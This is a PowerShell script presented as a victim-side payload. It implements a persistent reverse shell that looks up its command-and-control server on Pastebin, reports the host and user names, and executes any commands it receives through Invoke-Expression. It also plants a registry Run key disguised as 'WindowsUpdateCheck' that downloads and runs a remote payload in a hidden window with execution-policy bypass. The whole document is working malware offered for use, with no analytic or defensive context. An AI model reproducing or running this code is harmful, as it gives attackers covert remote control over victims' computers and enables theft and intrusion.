# Persistent Reverse Shell with Pastebin Fallback
# Victim-side payload - Run as: powershell -ep bypass -f payload.ps1

$ErrorActionPreference = "SilentlyContinue"
$pastebinUrl = "https://pastebin.com/raw/F4fUrSeS"
$port = 6553
$sleepInterval = 30

function Test-ConnectionWithTimeout {
    param($Server, $Port, $Timeout = 2000)
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $connectAsync = $tcpClient.BeginConnect($Server, $Port, $null, $null)
    $wait = $connectAsync.AsyncWaitHandle.WaitOne($Timeout, $false)
    if ($wait) {
        try {
            $tcpClient.EndConnect($connectAsync)
            $tcpClient.Close()
            return $true
        } catch {
            return $false
        }
    }
    $tcpClient.Close()
    return $false
}

function Get-ServerFromPastebin {
    try {
        $response = Invoke-WebRequest -Uri $pastebinUrl -UseBasicParsing -TimeoutSec 10
        return $response.Content.Trim()
    } catch {
        return $null
    }
}

function Invoke-ReverseShell {
    param($Server)
    
    try {
        $client = New-Object System.Net.Sockets.TcpClient($Server, $port)
        $stream = $client.GetStream()
        $buffer = New-Object byte[] 4096
        $encoding = New-Object System.Text.UTF8Encoding
        
        # Send initial connection message
        $initial = "Connected from $($env:COMPUTERNAME)\$($env:USERNAME)"
        $initialBytes = $encoding.GetBytes($initial)
        $stream.Write($initialBytes, 0, $initialBytes.Length)
        
        while (($client.Connected) -and (Test-ConnectionWithTimeout $Server $port 1000)) {
            # Read command from C2
            $read = $stream.Read($buffer, 0, $buffer.Length)
            if ($read -eq 0) { break }
            
            $command = $encoding.GetString($buffer, 0, $read).Trim()
            if ($command -eq "exit") { break }
            
            # Execute command
            $output = Invoke-Expression $command 2>&1 | Out-String
            $outputBytes = $encoding.GetBytes($output + "`n")
            $stream.Write($outputBytes, 0, $outputBytes.Length)
        }
        $client.Close()
    } catch {
        # Connection lost, fallback to pastebin
    }
}

# Persistence mechanism (add to registry for reboot persistence)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdateCheck"
$psCommand = "powershell -ep bypass -w hidden -c `"iex((New-Object Net.WebClient).DownloadString('http://yourserver.com/payload.ps1'))`""

try {
    if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $regPath -Name $regName -Value $psCommand -PropertyType String -Force | Out-Null
    }
} catch {}

# Main loop - Check pastebin first, then maintain connection
while ($true) {
    Write-Host "[*] Checking Pastebin for C2 server..." -ForegroundColor Green
    $c2Server = Get-ServerFromPastebin
    
    if ($c2Server) {
        Write-Host "[+] Found C2: $c2Server`:$port" -ForegroundColor Yellow
        Invoke-ReverseShell $c2Server
        Write-Host "[-] Connection lost, waiting $sleepInterval seconds..." -ForegroundColor Red
    } else {
        Write-Host "[-] No C2 server found in Pastebin, retrying..." -ForegroundColor Red
    }
    
    Start-Sleep $sleepInterval
}